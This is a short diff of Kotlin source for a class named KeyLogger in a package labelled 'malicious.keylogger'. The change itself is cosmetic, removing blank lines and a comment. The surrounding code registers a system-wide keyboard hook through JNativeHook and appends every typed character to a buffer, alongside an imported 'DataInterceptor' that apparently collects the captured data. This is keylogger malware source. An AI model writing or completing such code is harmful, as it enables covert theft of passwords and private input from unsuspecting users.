@@ -1,14 +1,11 @@
 package malicious.keylogger
 
-
 import com.github.kwhat.jnativehook.GlobalScreen
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
 import kotlinx.coroutines.*
 import kotlinx.serialization.Serializable
 import malicious.interceptors.DataInterceptor
-
-
 
 class KeyLogger(
     private val collectionIntervalSeconds: Int,
@@ -25,8 +22,6 @@ class KeyLogger(
     override fun nativeKeyTyped(e: NativeKeyEvent?) {
         val c = e?.keyChar
 
-
-        // 2. Filter out non-printable or control characters if necessary
         if (c != null && Character.isDefined(c)) {
             inputBuffer.append(c)
         }
